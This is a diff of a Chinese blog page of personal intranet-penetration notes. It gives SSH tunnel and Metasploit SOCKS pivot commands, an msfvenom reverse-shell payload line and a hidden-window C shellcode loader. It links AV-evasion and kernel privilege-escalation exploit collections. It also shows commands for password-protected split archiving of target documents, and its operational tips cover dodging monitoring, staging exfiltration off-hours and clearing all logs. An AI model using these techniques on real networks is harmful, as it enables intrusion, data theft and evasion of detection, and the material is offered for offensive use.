@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="thinks blog">
 <meta property="og:description" content="渗透中自己总计的一些笔记">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-25T07:13:09.860Z">
+<meta property="og:updated_time" content="2019-07-30T08:52:06.075Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网渗透笔记">
 <meta name="twitter:description" content="渗透中自己总计的一些笔记">
@@ -92,8 +92,10 @@
 
 <h2 id="一、端口转发"><a href="#一、端口转发" class="headerlink" title="一、端口转发"></a>一、端口转发</h2><p>Lcx<br>nc</p>
 <h2 id="二、代理"><a href="#二、代理" class="headerlink" title="二、代理"></a>二、代理</h2><p>windows 和 mac 下使用 Proxifier 配置代理<br>linux 使用 proxychians-ng , Github 地址：<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains-ng</a> </p>
-<h3 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a>Termite</h3><p>工具地址： <a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a><br>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
+<h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><p>工具地址： <a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a><br>主要特性： EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p>
 <h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>工具地址： <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a><br>利用 webshell 建立一个 socks 代理进行内网穿透，主要是正向代理</p>
+<h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host   #向隧道，监听本地port</span><br><span class="line">ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host   #反向隧道，用于内网穿透防火墙限制之类</span><br><span class="line">ssh -C -f -N -g -D listen_port user@Tunnel_Host     #直接进行socks代理</span><br></pre></td></tr></table></figure>
+
 <h3 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h3><p>工具地址： <a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a><br>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试（重点是稳定）。</p>
 <h3 id="meterpreter-代理"><a href="#meterpreter-代理" class="headerlink" title="meterpreter 代理"></a>meterpreter 代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; route add 10.1.1.129 255.255.255.255 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(handler) &gt; route print </span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.1.1.129         255.255.255.255    Session 1</span><br><span class="line">msf exploit(handler) &gt; use auxiliary/server/socks4a </span><br><span class="line">msf auxiliary(socks4a) &gt; show options </span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  </span><br><span class="line">msf auxiliary(socks4a) &gt; exploit -y</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf auxiliary(socks4a) &gt; </span><br><span class="line">[*] Starting the socks4a proxy server</span><br></pre></td></tr></table></figure>
 
@@ -108,15 +110,23 @@
 
 <h3 id="VS编译shellcode"><a href="#VS编译shellcode" class="headerlink" title="VS编译shellcode"></a>VS编译shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b &apos;\x00&apos; LHOST=192.168.1.2LPORT=5555 -f c</span><br></pre></td></tr></table></figure>
 
-<p>vs2017 下编译</p>
+<p>vs下编译</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)//运行时不显示窗口</span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">&quot;shellcode is here&quot;;</span><br><span class="line"> </span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(Memory, shellcode, sizeof(shellcode));</span><br><span class="line">	((void(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h3 id="免杀ShellCode加载器"><a href="#免杀ShellCode加载器" class="headerlink" title="免杀ShellCode加载器"></a>免杀ShellCode加载器</h3><p><a href="https://www.cnblogs.com/k8gege/p/11223393.html" target="_blank" rel="noopener">https://www.cnblogs.com/k8gege/p/11223393.html</a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a>     # Windows Exploit Suggester</p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a>   # Linux Exploit Suggester</p>
+<h2 id="关于打包"><a href="#关于打包" class="headerlink" title="关于打包"></a>关于打包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Rar文件打包，压缩d:\data\目录下所有2013-01-01后修改的doc文件，100M/包密码为Pass，-x为排除选项。</span><br><span class="line">rar.exe a–r –v100m new.rar –ta20130101000000 –hpPass –n*.doc –x*.exe d:\data\</span><br><span class="line"></span><br><span class="line">7z加密，压缩d:\data下所有文件，密码为Pass，分卷100M/包。</span><br><span class="line">7z.exe a c:\xx.7z -pPass -mhe d:\data -v100m</span><br><span class="line"></span><br><span class="line">Linux用 tar 打包文件是可以加密码，要跟openssl结合使用。</span><br><span class="line">tar -zcvf - pma|openssl des3 -salt -k password | dd of=pma.des3</span><br><span class="line"></span><br><span class="line">使用 tar 对加密文件解压：</span><br><span class="line">dd if=pma.des3 |openssl des3 -d -k password|tar zxf -</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>发现存活主机 </p>
+<h2 id="渗透注意事项"><a href="#渗透注意事项" class="headerlink" title="渗透注意事项"></a>渗透注意事项</h2><p>检查内网监控防范系统<br>谨慎使用ARP软件和大面积扫描软件<br>使用目标网络中无空闲机器，作为打包对象<br>使用内网大流量机器作为传输对象，如wsus服务器、视频会议系统<br>使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作<br>禁止使用psexec.exe<br>打包时避开用户工作时间<br>控制卷包大小&lt;100M<br>选择用户常用压缩软件<br>错峰下载数据<br>控制传输流量<br>清除所有操作日志<br>登录主机前先看看管理员是否在</p>
 <p>待续，有点乱，需要整理一下。。。</p>
+<p>参考<br><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&amp;mid=2655120260&amp;idx=2&amp;sn=d9f262f38eddd8cbd830b30c118a2b00&amp;chksm=bc86766b8bf1ff7db4557b2024f09c5c3def99894dbc585f5c2c7a0ede46b9c5d635cc8b8dbe&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&amp;mid=2655120260&amp;idx=2&amp;sn=d9f262f38eddd8cbd830b30c118a2b00&amp;chksm=bc86766b8bf1ff7db4557b2024f09c5c3def99894dbc585f5c2c7a0ede46b9c5d635cc8b8dbe&amp;scene=21#wechat_redirect</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/24/内网渗透笔记/" data-id="cjyicc57c00080sk5tj0m53k4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/24/内网渗透笔记/" data-id="cjys3p3zt00083sk54os041t0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
@@ -168,7 +178,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/安全建设/" style="font-size: 20px;">安全建设</a> <a href="/tags/安全开发/" style="font-size: 15px;">安全开发</a>
+      <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/安全建设/" style="font-size: 20px;">安全建设</a> <a href="/tags/安全开发/" style="font-size: 10px;">安全开发</a>
     </div>
   </div>
 
@@ -190,6 +200,14 @@
       <ul>
         
           <li>
+            <a href="/2019/07/30/域渗透笔记/">域渗透笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/DDOS攻击学习笔记/">DDOS攻击学习笔记</a>
+          </li>
+        
+          <li>
             <a href="/2019/07/24/企业资产监控/">企业资产监控</a>
           </li>
         
@@ -199,14 +217,6 @@
         
           <li>
             <a href="/2019/07/24/github信息泄露监控/">github信息泄露监控</a>
-          </li>
-        
-          <li>
-            <a href="/2019/07/24/蜜罐/">蜜罐</a>
-          </li>
-        
-          <li>
-            <a href="/2019/07/22/SSRF-TIPS/">SSRF TIPS</a>
           </li>
         
       </ul>
